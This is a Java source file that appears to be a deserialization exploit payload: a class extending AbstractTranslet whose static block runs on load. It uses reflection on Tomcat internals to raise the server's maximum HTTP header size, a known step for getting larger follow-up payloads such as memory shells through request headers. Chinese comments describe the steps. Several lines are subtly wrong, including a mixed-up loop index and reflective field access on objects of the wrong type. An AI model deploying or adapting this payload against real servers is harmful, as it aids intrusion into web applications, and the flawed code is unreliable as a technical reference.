import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.catalina.connector.Connector;
import org.apache.catalina.core.ApplicationContext;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.core.StandardService;
import org.apache.catalina.loader.WebappClassLoaderBase;
import org.apache.coyote.ProtocolHandler;
import org.apache.coyote.Request;
import org.apache.coyote.RequestGroupInfo;
import org.apache.coyote.http11.AbstractHttp11Protocol;

import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.List;

public class TYH extends AbstractTranslet {
    static {
        try {
            // StandardContext.context
            Field contextField = org.apache.catalina.core.StandardContext.class.getDeclaredField("context");
            // ApplicationContext.service
            Field serviceField = org.apache.catalina.core.ApplicationContext.class.getDeclaredField("service");
            // RequestInfo.req
            Field reqField = org.apache.coyote.RequestInfo.class.getDeclaredField("req");
            // Http11InputBuffer.headerBufferSize
            Field headerSizeField = org.apache.coyote.http11.Http11InputBuffer.class.getDeclaredField("headerBufferSize");
            // AbstractProtocol.getHandler
            Method getHandlerMethod = org.apache.coyote.AbstractProtocol.class.getDeclaredMethod("getHandler", null);

            contextField.setAccessible(true);
            serviceField.setAccessible(true);
            reqField.setAccessible(true);
            headerSizeField.setAccessible(true);
            getHandlerMethod.setAccessible(true);

            WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
            StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();
            ApplicationContext applicationContext = (ApplicationContext) contextField.get(standardContext);

            StandardService standardService = (StandardService) serviceField.get(applicationContext);
            Connector[] connectors = standardService.findConnectors();
            for(int i = 0; i < connectors.length; i++) {
                // http connector
                if (connectors[i].getScheme().length() == 4) {
                    ProtocolHandler protocolHandler = connectors[i].getProtocolHandler();
                    if (protocolHandler instanceof AbstractHttp11Protocol) {
                        // getDeclaredClasses 方法返回一个代表这个类的所有成员声明 Class 对象的数组, 即获取所有内部类
                        // 我们这里想获取 org.apache.coyote.AbstractProtocol$ConnectionHandler
                        Class[] classes = org.apache.coyote.AbstractProtocol.class.getDeclaredClasses();
                        for(int j = 0; j < classes.length; j++) {
                            // 参考博客条件为 52 == (classes[j].getName().length()) || 60 == (classes[j].getName().length())
                            if (classes[j].getName().length() == 52) {
                                Field globalField = classes[i].getDeclaredField("global");
                                globalField.setAccessible(true);
                                RequestGroupInfo global = (RequestGroupInfo) globalField.get(connectors[i]);

                                Field processorsField = org.apache.coyote.RequestGroupInfo.class.getDeclaredField("processors");
                                processorsField.setAccessible(true);
                                List processors = (List) processorsField.get(global);

                                for (int k = 0; k < processors.size(); k++) {
                                    Request tempRequest = (org.apache.coyote.Request) reqField.get(processors.get(k));
                                    // 10000 为修改后的 headersize
                                    headerSizeField.set(tempRequest, 10000);
                                }
                            } else {
                                System.out.println(classes[j].getName());
                            }
                        }
                        // 10000 为修改后的 headersize
                        ((AbstractHttp11Protocol<?>) protocolHandler).setMaxHttpHeaderSize(10000);
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
